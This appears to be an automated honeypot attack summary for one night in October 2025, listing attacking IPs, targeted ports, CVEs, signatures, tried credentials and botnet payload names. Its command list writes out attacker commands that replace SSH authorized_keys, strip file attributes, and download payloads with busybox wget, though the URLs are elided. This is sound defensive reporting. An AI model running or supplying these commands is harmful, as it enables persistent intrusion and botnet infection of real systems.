Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-04T00:01:28Z
**Timeframe:** 2025-10-03T23:20:01Z to 2025-10-04T00:00:01Z
**Log Files:**
- agg_log_20251003T232001Z.json
- agg_log_20251003T234001Z.json
- agg_log_20251004T00:00:01Z.json

### Executive Summary

This report summarizes 9,319 attacks recorded across multiple honeypots. The majority of malicious activity was captured by the Cowrie (SSH/Telnet) and Ciscoasa honeypots. A significant portion of the attacks originated from IP address `86.54.42.238`. The most frequently targeted services were Mail (Port 25) and SSH (Port 22). Attackers were observed attempting to deploy botnet scripts, perform reconnaissance, and bruteforce credentials. Multiple CVEs were targeted, with a focus on remote code execution and information disclosure vulnerabilities.

### Detailed Analysis

**Attacks by Honeypot:**
- **Cowrie:** 4,255
- **Ciscoasa:** 1,873
- **Suricata:** 1,214
- **Mailoney:** 944
- **Dionaea:** 537
- **Sentrypeer:** 196
- **Honeytrap:** 116
- **H0neytr4p:** 35
- **ssh-rsa:** 30
- **Redishoneypot:** 30
- **Tanner:** 33
- **Adbhoney:** 24
- **ConPot:** 12
- **Dicompot:** 8
- **Honeyaml:** 9
- **ElasticPot:** 3

**Top Attacking IPs:**
- 86.54.42.238
- 196.251.84.181
- 118.186.3.158
- 104.28.205.52
- 14.103.145.66
- 185.156.73.166
- 175.178.123.4
- 172.245.45.194
- 58.56.23.210
- 185.76.34.16
- 121.142.87.218
- 46.105.87.113

**Top Targeted Ports/Protocols:**
- 25
- 22
- 445
- 5060
- 3306
- TCP/80
- TCP/1433
- 80
- 23
- 443
- 6379

**Most Common CVEs:**
- CVE-2002-0013, CVE-2002-0012
- CVE-2021-3449
- CVE-2019-11500
- CVE-2021-35394
- CVE-2024-3721
- CVE-1999-0183
- CVE-1999-0517
- CVE-2023-26801

**Commands Attempted by Attackers:**
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `cd /data/local/tmp/; rm *; busybox wget http://...`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `whoami`
- `free -m | grep Mem ...`
- `crontab -l`
- `lscpu | grep Model`
- `tftp; wget; /bin/busybox ...`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET SCAN Suspicious inbound to MSSQL port 1433
- GPL MISC source port 53 to <1024
- ET CINS Active Threat Intelligence Poor Reputation IP (groups 43, 44, 45, 46, 48, 49, 50, 51)

**Users / Login Attempts (User/Password):**
- a2billinguser/
- root/ (multiple passwords)
- 345gs5662d34/345gs5662d34
- test/zhbjETuyMffoL8F
- azureuser/ (multiple passwords)
- joao/ (multiple passwords)
- admin/ (multiple passwords)
- default/ (multiple passwords)

**Files Uploaded/Downloaded:**
- wget.sh
- w.sh
- c.sh
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- boatnet.mpsl

**HTTP User-Agents:**
- (No data)

**SSH Clients:**
- (No data)

**SSH Servers:**
- (No data)

**Top Attacker AS Organizations:**
- (No data)

### Key Observations and Anomalies

- **Aggressive SSH Key Manipulation:** A recurring pattern involved attackers attempting to delete existing SSH configurations and install their own `authorized_keys` file. This is a common technique to establish persistent access.
- **Botnet Deployment:** Multiple commands indicate attempts to download and execute shell scripts (`w.sh`, `wget.sh`) and binaries (`.urbotnetisass`, `boatnet.mpsl`), characteristic of botnet propagation. These scripts fetch payloads for various architectures (ARM, x86, MIPS).
- **System Reconnaissance:** Attackers frequently ran commands like `uname`, `lscpu`, and `free -m` to gather information about the compromised system's architecture and resources, likely to tailor subsequent attacks.
- **High Volume Scans:** The prevalence of "NMAP" and "Dshield Block Listed" signatures indicates that much of the traffic is from automated scanners and known malicious sources conducting broad reconnaissance.